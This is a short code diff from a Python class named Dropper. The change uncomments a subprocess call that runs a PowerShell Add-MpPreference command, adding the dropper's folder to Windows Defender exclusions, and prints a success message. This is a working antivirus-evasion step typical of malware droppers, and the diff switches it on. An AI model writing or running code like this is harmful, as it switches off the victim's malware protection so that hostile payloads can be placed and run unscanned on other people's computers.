@@ -82,7 +82,7 @@ class Dropper:
         command = f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{self.folder_path}\'"'
 
         try:
-            #subprocess.run(command, shell=True, check=True)
+            subprocess.run(command, shell=True, check=True)
             print(f"Folder {self.folder_path} has been added to Windows Defender exclusions.")
         except subprocess.CalledProcessError as e:
             print(f"Failed to add exclusion: {e}")
